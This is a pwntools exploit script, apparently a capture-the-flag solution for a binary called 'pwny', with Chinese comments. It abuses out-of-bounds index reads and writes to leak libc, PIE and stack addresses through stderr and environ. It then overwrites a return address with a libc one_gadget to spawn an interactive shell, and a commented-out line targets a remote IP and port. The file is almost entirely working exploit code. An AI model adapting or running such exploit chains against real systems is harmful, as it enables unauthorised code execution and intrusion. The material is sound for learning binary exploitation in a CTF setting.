from pwn import *
context.binary = './pwny'
sh = process("./pwny", env={'LD_PRELOAD': './libc-2.27.so'})
# sh = process(["./ld-2.27.so", "./pwny"], env={'LD_PRELOAD': './libc-2.27.so'})
# sh = remote("124.71.229.55", "22991")


def write(idx):
    sh.sendlineafter("Your choice: ", "1")
    sh.sendlineafter(b"Index: ", p64(idx & 0xffffffffffffffff))


def read(idx, buf='', id=1):
    # sh.sendlineafter("Your choice: ", "2")
    sh.recvuntil("choice: ")
    sh.sendline("2")
    sh.sendlineafter("Index: ", str(idx))
    if(id == 0):
        sh.send(buf)


read(256)  # qword_202060 idx=256刚好就是fd的存储位置，都在.bbs段
# 第一次 read(256) 会将fd覆盖为一个随机数？
gdb.attach(sh)
read(256)
write(-4)
sh.recvuntil("Result: ")
stderr = int(b"0x" + sh.recvline(keepends=False), 16)
libc = ELF("./libc-2.27.so")
success(hex(stderr))
libc.address = stderr - libc.sym['_IO_2_1_stderr_']
success(hex(libc.address))

write(-0x5c)
sh.recvuntil("Result: ")
pie = int(b"0x" + sh.recvline(keepends=False), 16) - 0xa00
success(hex(pie))
base = pie + 0x202060  # .bss:00202060 qword_202060 dq 100h dup(?)
success(hex(base))


def calc(addr):
    return int((addr - base) / 8)


# gdb.attach(sh,"b *$rebase(0x8b4)\nc")
environ = libc.sym['environ']
write(calc(environ))
sh.recvuntil("Result: ")
environ = int(b"0x" + sh.recvline(keepends=False), 16) - 0xa00
success(hex(environ))

read(calc(environ), p64(0xdeadbeef), 0)
stack = environ + 0x8e0
read(calc(stack + 0x70), p64(0), 0)
read(calc(stack), p64(libc.address + 0x10a41c), 0)
sh.interactive()
